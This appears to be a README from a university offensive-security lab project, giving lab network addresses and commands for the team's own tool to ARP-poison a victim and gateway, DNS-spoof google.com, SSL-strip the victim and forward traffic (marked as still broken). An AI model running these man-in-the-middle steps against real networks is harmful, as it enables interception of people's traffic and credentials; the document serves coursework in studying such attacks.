# 2IC80Project
Lab on Offensive Computer Security
"
### Addresses:
Attacker:
10.0.123.4  08:00:27:4f:6a:5d

Victim:
10.0.123.5  08:00:27:23:55:6e

Gateway:
10.0.123.1  52:54:00:12:35:00

### Commands:

See ARP table: `arp`
Clear ARP table: `sudo ip -s -s neigh flush all`

# Run steps separately:
1. ARP poison the victim: 
`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.5" --macVictim "08:00:27:23:55:6e" --ipToSpoof "10.0.123.1"`

2. ARP poison the gateway: 
`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.1" --ipToSpoof "10.0.123.5"`

3. DNS Spoof the victim: `sudo python3 main.py --interface "enp0s10" dnsSpoof --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 

4. SSL Strip the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5"` 

STILL BROKEN:
5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --ipToSpoof "142.250.179.174"` _google.com_
